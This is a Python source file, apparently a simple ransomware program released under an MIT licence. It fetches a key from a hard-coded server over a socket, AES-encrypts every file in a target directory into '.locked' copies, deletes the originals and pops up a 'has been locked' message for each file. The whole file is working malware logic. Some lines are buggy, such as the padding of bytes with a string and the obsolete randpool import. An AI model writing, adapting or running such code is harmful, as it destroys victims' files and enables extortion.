#The MIT License (MIT)

# Copyright (c) 2016 klorox

# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:

# The above copyright notice and this permission notice shall be included in
# all copies or substantial portions of the Software.

# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
# THE SOFTWARE.

import os, random
from Crypto.Cipher import AES
from Crypto.Hash import SHA256
from Crypto.Hash import MD5
from Crypto.Util import randpool
import tkinter as tk
from tkinter import ttk  
import socket
from uuid import getnode as get_mac

C_K = "12345"



host = '127.0.0.1'
port = 443

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.connect((host, port))
s.send((bytes(C_K, 'utf-8')))
    
rcstring = s.recv(2048)
rcstring2 = s.recv(10000)


while 1:
    buf = s.recv(2048)
    dat = s.recv(10000)
    rcstring2 += dat
    rcstring += buf
    if not len(buf):
        break
        s.close()
    
password = rcstring
#password = password.decode('utf-8')
randAlpha = rcstring2

def getKey(password):
    hasher = SHA256.new(password)
    return hasher.digest()
    
key = getKey(password)

NORM_FONT= ("Verdana", 10)

def popupmsg(msg):
    popup = tk.Tk()
    popup.wm_title("!")
    label = ttk.Label(popup, text=msg, font=NORM_FONT)
    label.pack(side="top", fill="x", pady=10)
    B1 = ttk.Button(popup, text="Okay", command = popup.destroy)
    B1.pack()
    popup.mainloop()
    
    
def encrypt(key, filename):
    chunksize = 64*1024
    outputFile = filename + ".locked"
    filesize = bytes(os.path.getsize(filename)).zfill(16)
    IV =  b'1234567890123456'

        
    encryptor = AES.new(key, AES.MODE_CBC, IV)
    
    with open(filename, 'rb') as infile:
        with open(outputFile, 'wb') as outfile:
            outfile.write(filesize)
            outfile.write(IV)
            
            while True:
                chunk = infile.read(chunksize)
                if len(chunk) == 0:
                    break
                elif len(chunk) % 16 != 0:
                    chunk += ' '*(16 - (len(chunk) % 16))
                try:    
                    outfile.write(encryptor.encrypt(chunk))
                    #outfile.close()
                except ValueError as e:
                    break
    os.remove(filename)
    popupmsg(filename + " has been locked. ")
                
                
                
def allfiles():
        allFiles = []
        for root, subfiles, files in os.walk(os.getcwd() + "\\dir\\"):
                for names in files:
                        allFiles.append(os.path.join(root, names))
        return allFiles

encFiles = allfiles()    

def main():
    if password == "FalseKey":
        return
    elif password != "FalseKey":
        for file in encFiles:
            encrypt(key, file)
main()